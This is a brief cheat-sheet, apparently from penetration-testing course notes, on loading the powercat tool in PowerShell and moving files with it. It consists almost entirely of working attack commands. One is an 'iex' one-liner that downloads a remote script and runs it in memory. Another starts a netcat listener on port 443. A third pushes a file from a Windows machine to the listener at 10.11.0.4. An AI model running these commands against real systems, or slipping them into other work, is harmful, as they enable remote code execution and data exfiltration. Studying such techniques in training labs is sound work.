# 1) Load powercat via dot-sourcing
```ps
. .\powercat.ps1
```

# 2) Or load powercat via iex
```ps
iex (New-Object
System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/po
wercat/master/powercat.ps1')
```

# 3) Spawn remote listener
```sh
LPORT=443
sudo nc -lnvp $LPORT > receiving_powercat.ps1
```

# 4) Send file to remote
```ps
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```
